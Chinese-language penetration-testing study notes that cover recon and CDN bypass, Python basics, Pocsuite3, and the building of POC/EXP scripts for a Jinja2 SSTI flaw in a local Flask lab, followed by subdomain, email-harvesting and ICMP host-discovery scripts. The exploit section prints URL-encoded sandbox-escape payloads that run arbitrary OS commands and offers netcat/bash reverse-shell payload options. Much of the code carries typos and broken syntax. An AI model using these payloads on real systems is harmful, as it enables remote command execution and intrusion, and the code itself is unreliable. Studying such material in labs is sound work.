<details>
<summary>信息搜集</summary>

```
1.拿到域名后，判断域名是否存在CDN (Content Delivery Network,内容分发网络),http://ping.chinaz.com/
[1]查询IP>1,说明IP地址并不是真实的服务器地址
[2]查询IP[2,3],同时[2,3]IP地址属于同一个运营商时，可能为服务器的出口地址-->该服务器部署在内网中，，使用了不同运营商的映射进行互联网访问
[3]查询IP地址多个，并且分布在不同的地区时，基本可以确定网站就是使用了CDN的服务

绕过CDN获取真实IP信息
[1]内部邮箱
邮件服务系统都是部署在公司内部，并且咩呦经过CDN解析，可以通过目标网站的邮箱注册或订阅邮件功能，让网站的邮箱服务器给自己的邮箱服务发生邮件
查看邮件的原始邮件头，包含邮件服务器的IP地址
[2]查看域名的历史解析记录，后来加上的CDN服务，存在未使用CDN时的真实IP地址，可以通过EXAMPLE网站https://dnsdb.io/zh-cn进行查询
[3]字域名查询，子站或旁站的IP地址拆解网站的真实IP地址
[4]国外地址访问，没有多少国内的CDN服务商会进行服务    <---
[5]主域名查询，去掉www,ping域名，看是否有变化
[6]Nslookup查询
NS记录：域名服务器的记录，nslookup -qt=ns xxx.com
MX记录：mail服务的权重值，nslookup -qt=mx xxx.com
TXT记录：为某一条记录设置说明，使用nslookup -qt=txt xxx.com

2.搜集真实IP后，whois信息进行搜集 http://whois.chinaz.com/
3.确定具体信息后，查询公司有关信息，如邮箱、邮箱格式、公司员工姓名、公司人员配置等
同时在github、码云等代码托管平台查找敏感信息：包含数据库连接信息、密码、甚至网站源代码等
4.CMS建站系统，如phpcms、eshop、wordpress、dedecms、dicuz、phpweb、dvbbs、thinkphp等
指纹识别网站http://www.yunsee.cn/finger.html --->CMS信息可以查找相关的历史漏洞
```

</details>

<details>
<summary>漏洞探测</summary>

```
AWVS(Acunetix Web Vulnerability Scanne):通过爬虫
NESSUS：系统扫描和分析软件，提供主机漏洞扫描服务
AppScan：安装在windows系统上，对Web应用进行漏洞扫描和安全测试
```

</details>

<details>
<summary>漏洞验证</summary>

```
在公开资源寻找漏洞：乌云镜像网站、Google Hacking、渗透代码网站、通用应用漏洞、厂商漏洞警告
可自己搭建乌云镜像站，WooYun.ory
```

</details>

----------------------------------------------------------------------------

<details>
<summary>python 序列</summary>

```
----------------------------------------------------------------------------
列表list = [,]
添加单个元素： .append() //尾部添加
添加列表： .extend() //尾部添加
指定位置添加： .insert(7, )

删除列表首次出现元素： .remove()
删除并返回列表中指定的下标元素： .pop() //默认值为-1，是最后一个 | .pop(0) //返回第一个元素

返回指定元素在列表中出现的次数：.count() //元素对应出现的次数

将列表中的所有元素逆序： .reverse()
对列表中的元素进行排序： .sort(key=str,reverse=False) //key指定排序依据，reverse决定升序False,降序True
----------------------------------------------------------------------------
元组 tuple = (,)
元组(,)与列表[,]不同，元组属于不可变序列
----------------------------------------------------------------------------
字典dic = {键：值,} //键不能重复，值可以重复
通过dict()创建字典： lab = dict(,)
修改字典中的元素： dic['键']=修改值
添加字典新元素： dic['']='' //保持先进后出，新添加的一直在第一个后出，最后输出
返回字典中的元素：.items()
删除字典中元素： del dic['键']
----------------------------------------------------------------------------
```

</details>


<details>
<summary>python 控制结构</summary>

```
顺序结构、选择结构、循环结构
----------------------------------------------------------------------------
选择结构
#!/user/bin/pyton
#coding:utf-8
studentScore = int(input('Scores of students: '))
if (studentScore < 60):
  print('不及格‘）
if (60 <= studentScore < 80):
  print('良好‘）
if (strdentScore >= 80):
  print('优秀')
----------------------------------------------------------------------------
循环结构：for循环一般用于有明显边界范围的情况，while循环一般用于循环次数难以确定的情况
#！/usr/bin/python
#coding:utf-8
Sum = 0
for i in range(1,101):
    Sum = Sum + i
else:
    print('Sum = ', Sum)

运行结果：5050

#!/usr/bin/python
#coding:utf=8
x = int(input('x='))
Sum = 0
while x != 0 :
    Sum = Sum + x
    x = x - 1
else:
    print('Sum=', Sum)

输入100，运行结果：5050
输入1000，运行结果：500500
----------------------------------------------------------------------------
```

</details>

<details>
<summary>文件处理</summary>

```
数据库文件、图像文件、音频文件、视频文件、文本文化等
----------------------------------------------------------------------------
文本文件：常规字符串，由文本行组成，每行通常由换行符'\n'结尾，读取、写入、删除、修改，关闭并保持

open(file[,mode='r'[,buffering=-1]])
//mode:打开后的处理方式，读模式、写模式、追加模式、二进制模式、文本模式、读写模式
//buffering:缓存模式，0:不缓存、1:使用行缓存模式、>1:缓存区的大小，默认值为-1；
//二进制文件和非交互文本文件以固定大小的块为缓冲单位，等价于io
----------------------------------------------------------------------------
对文件操作：读写、写入、追加、设置二进制模式、文本模式、读写模式

w:写入模式  文件存在，清空；文件不存在，创建
x:写入模式  创建新文件；文件存在，抛出异常
a:追加模式  也是写入模式的一种，不覆盖文件的原始内容

r: 读模式（默认模式，可省略），文件不存，抛出异常
+：读写模式
>>> f = open('demo.txt', 'r')
>>> print(f.readline()) //读取第一行内容
>>>
>>> print(f.read()) //读取全部
----------------------------------------------------------------------------
f.close() //关闭文件对象
关键字with 能够自动管理资源，总能保证文件正确关闭，并且在代码执行后自动还原开始执行代码块时的现场
>>> with open('demo.txt','a') as f:
...     f.write('hello ') //继续追加
...
----------------------------------------------------------------------------
```

</details>

<details>
<summary>异常处理结构：提高代码的鲁棒性，提高代码的容错性</summary>

```
----------------------------------------------------------------------------
[1]try...except...结构 //判断是否
try:代码块为可能引发异常的语句
except:捕获相应的异常
当try字句代码执行异常并且被except字句捕获，执行except字句的代码块

#!/usr/bin/python
#coding:utf=8
mathScore = input('数学成绩')
try:
    mathScore = int(mathScore)
    if(0<mathScore <=100):
        pritnt("输入的数学成绩为：",mathScore)
    else:
        print("输入不在本科成绩范围内")
except Exception as e:
    print('输入的数值有误')
----------------------------------------------------------------------------
[2]try...except...else...结构 //判断是 和 否，否之后; 没有异常会执行else
#!/usr/bin/python
#coding:utf=8
mathScore = input('数学成绩')
try:
    mathScore = int(mathScore)
except Exception as e:
    print('输入的数值有误')
else:
    if(0<mathScore <=100):
       pritnt("输入的数学成绩为：",mathScore)
    else:
       print('请输入正确的数学成绩') 
----------------------------------------------------------------------------
[3]try...eccept...finally...结构，无论try子句是否正常执行，finally子句中的代码块总会得到执行
在开发，该结构通常用来做清理工作，释放try子句中申请的资源
确保程序的鲁棒性，要求带有异常处理的结构。鲁棒是指系统的健壮性，是在存在异常和危险的情况下系统生存的关键

#！/usr/bin/python
#coding:utf=8
a = int(input('a:'))
b = int(input('b:'))
try:
    div = a/b
    print(div)
except Exception as e:
    print ('The second parameter cannot be 0.')
finally:
    print('运算结果')  
----------------------------------------------------------------------------
```

</details>

----------------------------------------------------------------------------

<details>
<summary>Socket网络编程</summary>

```
connect(address):连接远程计算机
send(bytes[,flags]):发送数据
recv(bufsize[,flags]):接收数据
bind(address):绑定地址
listen(backlog):开始监听，等待客户端连接
accept():响应客户端的一个请求，接受一个连接
```
</details>

<details>
<summary>服务端代码</summary>

```
# coding：utf-8
import socket
language = {'what is your name':'I am Tom','how old are you':'25','bye':'bye!'}
HOST = '127.0.0.1"
POTR = 6666
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) //AF_INET：IPv4，SOCK_STREAM：TCP面向连接
s.bind((HOST,PORT))
s.listen(1) //1表示等待队列最大长度
print("Listing at port 6666")
conn,addr = s.accept() //通信套接字，客户端地址=阻塞等待
print('Connect by: ',addr)
while True: //无限循环接收消息
    data = conn.recv(1024)
    data = data.decode() //解码
    if not data:
        break //如果客户端关闭连接,返回空数据
    print('Received message:',data)

    conn.sendall(language.get(data,'Nothing').encode())
    //自动回复;.encode():把字符串变成字节；
    //language.get("what is your name", "Nothing")；
    //conn.sendall(b'I am Tom')；
    //encode() —— 编码：把字符串(str)变成字节(bytes)

conn.close() //关闭客户端连接
s.close() //释放端口
```

</details>

<details>
<summary>客户端代码</summary>

```
# coding:utf-8
import socket
import sys
HOST = "127.0.0.1"
PORT = 6666
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    s.connect((HOST,PORT))
except Exception as e:
    print('server not found!')
    sys.exit()
while True: //无限循环
    c = input('YOU SAY:') //然后在键盘输入些什么
    s.sendall(c.encode())
    data = s.recv(1024)
    data = data.decode()
    print('Received:',data)
    if c.lower() == '再见': //.lower()大写转小写
        break
s.close()
```

</details>

----------------------------------------------------------------------------

<details>
<summary>可执行文件转换_PyInstaller</summary>

```
https://pypi.org/project/PyInstaller

在windows：
>>> python setup.py install
需要准备好要打包的python文件 和 需要绑定的图标类型.ico
>>> pyinstaller -F -i snail.ico xx.py
会存储在dist文件夹,运行.exe

在Linux：
>>> python setup.py install
>>> pyinstaller -F xx.py
~/dist$ ./xx.py
```

</details>

----------------------------------------------------------------------------

<details>
<summary>Proof of Concept,POC 渗透概论验证</summary>

```
Exploit,EXP 漏洞利用
渗透测试框架 Metasploit、Pocsuite、Fsociety

Pocsuite由‘知道创宇404实验室'打造的开源的远程漏洞测试框架，同时也是POC开发框架
Pocsuite 3是POC/EXP 的SDK开发包，Seebug网站由几千个基于Pocsuite的POC/EXP ，可以基于Poscuite 3 进行二次开发

Pocsuite 3集成：
ZoomEye API:批量获取指定条件的测试目标，使用ZoomEye的Dork进行搜索
Seebug API:读取指定组件或者类型的漏洞的POC或者本地POC，自动化测试
Ceye API:验证盲打的DNS和HTTP请求

安装：
>>> git clone git@github.com:nopesec/pocsuite3.git
或是
>>> wget https://github.com/knownsec/pocsuite3/archive/master.zip
或是
>>> pip install pocsuite3
验证：
>>> pocsuite -version
```

</details>


<details>
<summary>Pocsuite</summary>

```
--verify参数调用_verify方法：验证目标是否存在漏洞
--attack参数调用_attack方法：向目标发起攻击
----------------------------------------------------------------------------
def _attack(self):
    result = {}
    ...
    return self.parse_output(result)

def _verify(self):
    result = {}
    ...
    return self.parse_output(result)
----------------------------------------------------------------------------
[1]Verify验证模式；-r poc脚本路径；-u 目标地址;
>>> python pocsuite.py -r pocs/test1.py -u https://www.xxx.com --verify
[2]批量验证;-f 目标IP写到txt文本
>>> python pocsuite.py -r pocs/test1.py -u url.txt --verify
[3]对所有poc目标进行测试
>>> python pocsuite.py -r pocs/* -u https://www.xxx.com --verify
[4]使用多线程
>>> python pocsuite.py -r pocs/test1.py -u url.txt --verify --threads 10
[5]使用Zoomeye搜索引擎，搜索开放端口为6379的Redis服务
>>> python cli.py --dork 'port:6379' --vul-keyword 'redis' --max-page 2
[6]Attack模式，向目标发起有效攻击
>>> python pocsuite.py -r pocs/test1.py -u url.txt --attack
[7]shell模式
>>> python pocsuite.py -r pocs/test1.py -u url.txt --shell
[8]使用自定义命令'comman‘，调用外部传递参数，进行半交互式命令执行
>>> python pocsuite.py -r pocs/test1.py -u url.txt --attack --command "whoami"
```

</details>


<details>
<summary>POC 脚本编写</summary>

```
1.Flask服务模版环境搭建
Flask是python编写的轻量级Web应用框架，使用BSD授权
WSGI工具箱采用Werkzeug,
模版引擎规则使用Jinja2
Flask属于微框架micro-framework

通过wget或Github下载
Docker-compose build //编译下载漏洞环境所需的配置
Docker-compose up -d //启动漏洞环境
安装之后访问 本机地址:8080

漏洞服务代码
~# docker ps
~# docker exec -it 93s2 bash
/ app# ls
/ app# cat app.py
<SNIP>
name = request.args.get('name', 'guest') //name的值是直接从get参数中获取的，所以Template是完全可控的
</SNIP>

可在 本机地址:8000?name={{2*2}} 回车

POC的命名形式： 组成漏洞应用名_版本号_漏洞类型名称 （只能小写、下划线、数字）
```

</details>

<details>
<summary>编写POC实现类DemoPOC,继承自POCBase类</summary>

```
from poscuite3.api import Output, POCBase, register_poc, requests, logger
from poscuite3.api import get_listener_ip, get_listener_port
from poscuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib utils import random_str

    class DemoPOC(POCBase):
```

</details>

<details>
<summary>填写POC信息字段</summary>

```
vulID = '1571'       #ssvid ID ,如果是提交漏洞的同时提交PoC,则写成0
version = '1'         #默认为1
author = 'seebug'    #POC作者名字
vulDate = '2014-10-16'  #漏洞公开的时间，不明确时可以写今天
createDate = '2014-10-16' #编写POC的日期
updateDate = '2014-10-16' #更新时间，默认和编写时间一样
references = ['https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html'] #漏洞地址来源，0day不用写
name = 'Drupal 7.x /includes/database/database.inc name_SQL_POC' #POC名称
appPowerLink = 'https://www.drupal.org/' #漏洞厂商的主页地址
appName = 'Drupal'  #漏洞应用名称
appVersion = '7.x'  #漏洞影响版本
vulType = 'SQL Injection'   #漏洞类型
desc = '''
Drupal 在处理IN语句时，展开数组时key带入SQL语句导致SQL注入，可以添加管理员，造成信息泄露
    ‘’‘    #漏洞简要描述
samples = []  #测试样列，使用POC测试成功的网站
install_requires = []
```

</details>

<details>
<summary>编写验证模式，在_verify方法中写入POC验证脚本</summary>

```
def _verify(self):
    output = Output(self)  #验证代码
    if result:    #result 表示放回结果
        output.success(result)
    else:
        output.fail('target is not vulnerable')
    return output
```

</details>

<details>
<summary>编写攻击模式</summary>

```
//用_attack()函数中写入EXP利用脚本，在攻击模式下可以对目标进行getshell、查询管理员账户密码等操作，定义它的方法与检测模式类似
def _attack(self):
    output = Output(self)
    result = {}
    #攻击代码
//如果该POC没有攻击模式，可以在_attack()函数下加入return self._verify(),无须再写_attack()函数

//Poscuite框架 填写漏洞 IP地址进行url构造 ---> ‘/?name='
//判断其返回状态及payload值，200:网页正常请求 484:服务器将url传入的payload正常执行，说明此处存在安全漏洞

def _verify(self):
    '''verity mode'''
    result = {}
    path = "/?name="
    url = self.url + path
    payload = "{{2*2}}"

    #first req
    try:
        resq = requests.get(url + payload)
        if resq and resq.status_code == 200 and "484" in resq.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Name'] = payload
        except Exception,e:
            pass
        return self.parse_output(result)
----------------------------------------------------------------------------
//将模版_verify方法替换Flask漏洞检测的脚本便完成了POC的编写
//执行
root@kali:~/pocsuite3-master# pocsuite -r test2.py -u http://127.0.0.1:8000 --verify
```

</details>

<details>
<summary>EXP 脚本编写</summary>

```
----------------------------------------------------------------------------
//EXP脚本的编写POC脚本编写一样，只需要修改_attack部分，替换成漏洞利用的脚本即可
//Jinja2模版访问python的内置变量并调用时，需要用到python沙盒逃逸方法

__bases__:以元组返回一个类所直接继承的类
__mro__:以元组返回继承关系链
__class__:返回对象所属的类
__globals__:以dict返回函数所在模块命名空间中的所有变量
__subclasses__():以列表返回类的子类
_builtins_:内建函数
----------------------------------------------------------------------------
python中可以直接运行一些函数，如int(),list()等，这些函数可以在__builtins__中查到
查看的方法时dir(__builtins__)
利用python特性，渗透测试的思路是利用_builtins_的特性得到eval

for c in().__class__.__base__[0].__subclass__():
    if c.__name__=='_IterationGuard':
    c.__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")

再将其转为Jinja2语法格式，在每个语句的开始和结束处使用{{%%}}括起来,%20{% --> :

{%%20for%20c%20in%20[].__class__.__base__.__subclass__()%20%}%20{%' \
'%20if%20c.__name__==%27_IterationGuard%27%20%}%20{{%20c.__init__.__globals__[%27__builtins__%27]' \
'[%27eval%27]("__import__(%27os%27).popen(%27whomi%27.read()")%20%%}%20{%%20endif%20%}%20{%' \
'%20endfor%20%}

//拆解
%20{{%20c.__init__.__globals__[%27__builtins__%27][%27eval%27]("__import__(%27os%27).popen(%27whomi%27.read()")%20%%}%20{%%20endif%20%}%20{%%20endfor%20%}
//再拆解
%20{{%20  %20%%}  %20{%%20endif%20%}%20{%%20endfor%20%}
//再拆解
{{  %%}

[1]在{{  %%}这里面的是c.__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")

[2].system('whoami')") ---> .popen(%27whomi%27.read()")

[3]CyberChef: 'URL Decode' -> 'URL Encode'

%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclass__()%20%25%7D%20%7B%25'%20%5C%0A'%20if%20c.__name__=='_IterationGuard'%20%25%7D%20%7B%7B%20c.__init__.__globals__%5B'__builtins__'%5D'%20%5C%0A'%5B'eval'%5D(%22__import__('os').popen('whomi'.read()%22)%20%25%25%7D%20%7B%25%20endif%20%25%7D%20%7B%25'%20%5C%0A'%20endfor%20%25%7D
----------------------------------------------------------------------------
'%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()'\
    '%20%25%7D%20%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20'\
    'for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__'\
    '%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()'\
    '%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__("os").popen("'+cmd+'").read()%27)'\
    '%20%7D%7D%oA%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor'\
    '%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D'

'{% for c in [].__class__.__base__.__subclasses__()%}
    {% if c.__name__ == 'catch_warnings' %}{% for b in c.__init__.__globals__.values() %}
    {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("' cmd '").read()')}}
    {% endif %}{% endif %}{% endfor %}
    {% endif %}{% endfor %}'
----------------------------------------------------------------------------
```

</details>

<details>
<summary>将EXP写到_attack方法中</summary>

```
def _attack(self):
    '''attack mode'''
    result = {}
    path = "/?name="
    url = self.url + path
    payload = '{%%20for%20c%20in%20[].__class__.__base__.__subclass__()%20%}%20{%' \
'%20if%20c.__name__==%27_IterationGuard%27%20%}%20{{%20c.__init__.__globals__[%27__builtins__%27]' \
'[%27eval%27]("__import__(%27os%27).popen(%27whomi%27.read()")%20%%}%20{%%20endif%20%}%20{%' \
'%20endfor%20%}'

    try:
        resq = requests.get(url + payload)
        if resq and resq.status_code == 200 and "www" in resq.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Name'] = payload
        except Exception,e:
            pass
        return self.parse_output(result)
----------------------------------------------------------------------------
//Jinja2 SSTI Payload
//运行
root@kali:~/pocsuite3-master# pocsuite -r test2.py -u http://127.0.0.1:8000 --attack
```

</details>

<details>
<summary>接受用户输入的命令行参数</summary>

```
def _options(self):
    o = OrderedDict()
    payload = {
        "nc": REVERSE_PAYLOAD.NC,
        "bash": REVERSE_PAYLOAD.BASH,
    }
    o["command"] = OptDict(selected="bash", default=payload)
    return o
```

</details>

<details>
<summary>创建cmd变量</summary>

```
def _attack(self):
    result = {}
    path = "?name="
    url = self.url + path
    #print(url)
    cmd = self.get_option("command")
  
    payload = '%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()'\
    '%20%25%7D%20%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20'\
    'for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__'\
    '%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()'\
    '%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__("os").popen("'+cmd+'").read()%27)'\
    '%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor'\
    '%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D'
    try:
        resq = requests.get(url + paylaod)
        t = resq.text
        t = t.replace('\n', '').replace('\r','')
        print(t)
        t = t.replace(" ","")
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = url
        result['VerifyInfo']['Name'] = t
    except Exception as e:
        return
----------------------------------------------------------------------------
root@kali:~/pocsuite3-master# pocsuite -r test3.py -u http://x.x.x.x:8000/ --attack --command 'id'
//Flash漏洞，"{{}}"中的内容会被当作代码执行，相应的防御中就需要对"{{}}"进行过滤，禁止次符号传入参数中。
```

</details>

----------------------------------------------------------------------------
#### 被动信息搜索

<details>
<summary>IP查询</summary>

```
>>> import socket
>>> ip = socket.gethostbyname('www.baidu.com') //gethostbyname()函数
>>> print(ip)
```

</details>

<details>
<summary>whois查询</summary>

```
pip install python-whois //模块
>>> from whois import whois
>>> data = whois('www.baidu.com')
>>> print(data)
```

</details>

<details>
<summary>子域名挖掘subdomain.py</summary>

```
#! /usr/bin/env python
# _*_ coding:utf-8 _*_
import requests
from bs4 improt BeautifulSoup
from usrllib.parse import urlparse
import sys

def bing_search(site, pages):
    Subdomain = [] #以列表形式存储子域名
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
        'Accept': 'texe/html,application/xhtml+xml,application/xml;q=0.9, */*;q=0.8',
        'Referer': "https://cn.bing.com",
        'Cookie': 'MUID=XXXXXXXXX&t=6" #填写相应的Cookie值
    }
    for i in range(1,int(pages)+1):
        url = "https://cn.bing.com/search?q=site%3a"+site+"&go=Search&qs=ds&first="+ str((int i)-1)*10) + "&FORM=PERE"
        html = requests.get(url, heades=headers)
        soup = BeautifulSoup(html.content, 'html.parser')
        job_bt = soup.findAll('h2')
        for i in job_bt:
            link = i.a.get('href')
            domain = str(urlparse(link).scheme + "://" + urlparse(link).netloc)
            if domain in Subdomain:
                pass
            else:
                Subdomain.append(domain)
                print(domain)

if __name__ == '__main__':
    if len(sys.argv) == 3:
        site = sys.argv[1]
        page = sys.argv[2]
    else:
        print ("usage: %s baidu.com 10" % sys.argv[0]) #输出帮助信息
        sys.exit(-1)
    Subdomain = bing_search(site, page)

//运行：
//# python3 subdomain.py baidu.com 15
//输入baidu.com,对该域名进行子域收集,15为引擎页数
```
</details>

<details>
<summary>邮件爬取</summary>

```
import sys
import getopt
import requests
from bs4 import BeautifulSoup
import re

//[1]
//没有异常发送，执行定义的start()函数，通过sys.argv[]实现外部指令的接受。
//sys.argv[0]表示代码本身的文件路径
//sys.argv[1:]表示从第一个命令行参数到输入最后一个命令行参数，存储形式为list类型

if __name__ == '__main__':
    #定义异常
    try:
        start(sys.argv[1:])
    except  KeyboardInterrupt:
        print("interrupted by user, killing all threads...")

//[2]
//编写命令行参数处理功能
//getopt.getopt()函数处理命令行参数，短选项'-字母',长选项'--单词'
//opts为一个两元组列表，(选项串,附加参数)
//通过for语句循环输出opts列表中的数值并赋值给自定义的变量

#主函数，传入用户输入的参数
def start(argv):
    url = ""
    pages = ""
    if len(sys.argv) < 2:
        print("-h 帮助信息;\n")
        sys.exit()
    #定义异常处理
    try:
        banner()
        opts,args = getopt.getopt(argv, "-u:-p:-h")
    except getopt.GetoptError:
        print('Error an argument!')
        sys.exit()
    for opt ,arg in opts:
        if opt == "-u":
            url = arg
        elif opt == "-p":
            pages = arg
        elif opt == "-h":
            print(usage())
    launcher(url ,pages)

//[3]
//输出帮助信息
//开头: \033[显示方式; 前景色 ; 背景色m
//结尾部分： \033[0m

//print('\033[0;30;41m 字样 \033[0m')

//print('\033[0;36;47m 字样 \033[0m')

#banner信息
def banner()
print('\033[1;34m###############################################################################\033[0m\n'
      '\033[1;34m##################\033[1;32字样\033[1;34m#######################################\033[0m\n'
      '\033[1;34m###############################################################################\033[0m\n'
#使用规则
def usage():
    print('-h: --help;')
    print('-u: --url;')
    print('-p: --pages;')
    print('eg: python -u "www.baidu.com" -p 100'+'\n')
    sys.exit()
##未授权函数检测

//[4]
//确定搜索邮件的关键字
//调用bing_search()和baidu_search()两个函数
//获取的结果进行列表合并，去重之后，循环输出

#漏洞回调函数
def launcher(url, pages):
    email_num = []
    key_words = ['email', 'mail', 'mailbox', '邮件', '邮箱', 'postbox']
    for page in range(1,int(page)+1):
        bing_emails = bing_search(url, page, key_word)
        baidu_emails = baidu_search(url, page, key_word)
        sum_emails = bing_emails + baidu_emails
        for email in sum_emails:
            if email in email_nums:
                pass
            else:
                print(email)
                with open('data.txt', 'a+') as f:
                    f.write(email + '\n')
                email_num.append(email)

//[5]bing搜索引擎
//bing引擎具有反爬防护，
//会通过限定referer、cookie等信息确定是否网页爬取操作
//可以通过指定referer与requests.session()函数自动获取cookie信息，绕过

def bing_search(url, page, key_word):
    referer = "http://cn.bing.com/search?q=email+site%3abaidu.com&qs=n&sp=-1&pq=emailsite%3abaidu.com&first=1&FORM=PERE1"
    conn = requests.session()
    bing_url = "http://cn.bing.com/search?q=" + key_work + "+site%3a" + url + "&qs=n&sp=-1&pq=" + key_word + "site%3a" +url + "&first=" + str((page-1)*10) + "&FORM=PERE1"
    conn.get('http://cn.bing.com', headers=headers(referer))
    r = conn.get(bing_url, stream=True, headers=headers(referer), timeout=8)
    emails = search_emails(r.text)
    return emails

//[6]baidu搜索引擎
//百度反爬防护：referer和cookie进行校验、在页面中通过JavaScript语句进行动态请求链接，
//从而导致不能动态获取页面中的信息
//可以通过，对链接的提取，再进行requests请求

def baidu_search(url, page, key_word):
    email_list = []
    emails = []
    referer = "https://www.baidu.com/s?wd=email+site%3Abaidu.com&pn=1"
    baidu_url = "https://www.baidu.com/s?wd="+key_word+"+site%3A"+url+"&pn="+str((page-1)*10)
    conn = requests.session()
    conn.get(referer,headers=headers(referer))
    r = conn.get(baidu_url, headers=headers(regerer))
    soup = BeautifulSoup(r.text, 'lxml')
    tagh3 = soup.find_all('h3')
    for h3 in tagh3:
        href = h3.find('a').get('href')
        try:
            r = requests.get(href, headers=headers(referer),timeout=8)
            emails = search_email(r.text)
        except Exception as e:
            pass
        for email in emails:
            email_list.append(email)
    return email_list

//[7]正则表达获取邮箱密码

def search_email(html):
    emails = re.findall(r"[a-z0-9\.\-+_]+@[a-z0-9\.\-+_]+\.[a-z]+",html,re.I)
    return emails

def headers(referer):
    headers = {'User-Agent': 'Mozilla/5.0 (X111; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
        'Accept': '*.*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip,deflate',
        'Referer': referer

//执行
//# python3 emailCraw.py -u "baidu.com" -p 1
//-u 参数指定域名 -p page
```

</details>

#### 主动信息搜索

<details>
<summary>基于ICMP的主机发现_Scapy库</summary>

```
//Internet Control Message Protocol,Internet报文协议)
//scapy用于发送ping请求和接收目标主机的应答数据
//差错通知
//信息查询
//Scapy库：TCP,UDP,IP,ARP等
//# python3 -m pip install -i https://pypi.douban.com/simple --pre scapy[complete]

#!/usr/bin/python
#coding:utf-8
from scapy.all import *  
from random import randint  
from optparse import PotionParser 

//将处理后IP地址传入 Scan()函数
def main():
    parser = OptionParser("Usage:%prog -i <target host> ")    #输出帮助信息
    parser.add_option('-i', type='string', dest='IP', help='specify target host')  #获取IP地址参数
    options,args = parser.parse_args()
    print("Scan report for " + options.IP + "\n")

    if '-' in options.IP:
        for i in range(int(options.IP.split('-')[0].split('.')[3]), int(options.IP.split('-')[1]) + 1):
            Scan(
                options.IP.split('.')[0] + '.' + options.IP.split('.')[1] + '.' + options.IP.split('.')[2] + '.' + str(i))
            time.sleep(0.2)
        else:
            Scan(options.IP)
        print("\nScan finished!...\n")

if __name__ == "__main__":
    try:
        main()
    excetp KeyboardInterrupt:
        print("interrupted by user, killing all threads...")

//Scan()函数调用ICMP
def Scan(ip):
    ip_id = randint(1, 65535)
    icmp_id = randint(1, 65535)
    icmp_seq = randint(1, 65535)
    packet = IP(dst=ip, ttl=64, id=ip_id/ICMP(id=icmp_id, seq=icmp_seq)/b'rootkit'
    result = sr1(packet, timeout=1, verbose=False)   //      False<----ICMP探测主机存活
    if result:
        for rcv in result:
            scan_ip = rcv[IP].src
            print(scan_ip + '--->' 'Host is up')
    else:
        print(ip + '--->' 'host is down')

//运行
// # python3 ICMP_host.py -i IP
```

</details>

<details>
<summary>基于ICMP的主机发现_Namp库</summary>

```
// -sn 只测试该主机的状态
// -PE 表示使用ICMP

#!/usr/bin/python3
# -*- coding: utf-8 -*-

import nmap
import optparse

//将处理后IP地址传入 NampScan函数
if __name__ == '__main__':
    parser = optparse.OptionParser('usage: python %prog -i ip \n\n' 'Example: python %prog -i 192.168.1.1 [192.168.1.1-100]\n')

    # 添加目标IP参数
    parser.add_option('-i', '--ip', dest='targetIP', default='192.168.1.1', type='string', help='target ip address')
    options,args = parser.parser_args[])

    if '-' in options.targetIP:
        for i in range(int(options.targetIP.split('-')[0].split('.')[2], int(options.targetIP.split('-')[1])) + 1):
            NampScan(options.targetIP.split('.')[0] + '.' + options.targetIP.split('.')[1] + '.' + options.targetIP.split('.')[2] + '.' + str(i))
    else:
        NmapScan(options.targetIP)

//NampScan函数 调用nm.scan()函数，发起ping扫描
//argusments 为Nmap的扫描参数
// -sn:使用ping进行扫描
// -PE:使用ICMP的echo请求包(-pp：使用timestamp参数包，-PM：netmask请求包

def NmapScan(targetIP):
    # 实例化 PortScanner 对象
    nm = nmap.PortScanner()
    try:
        result = nm.scan(hosts=targetIP, arguments='-sn -PE')

        # 对结果进行切片，提取主机状态信息
        state = resulte['scan'][targetIP]['status']['state']
        print("[{}] is [{}]".format(targetIP, state))
    except Exception as e:
        pass

//运行
// # python3 nmap_ICMP_find.py -i IP

//缺陷：网络设备对ICMP采取了屏蔽策略时，就会导致扫描结果不准确
```

</details>
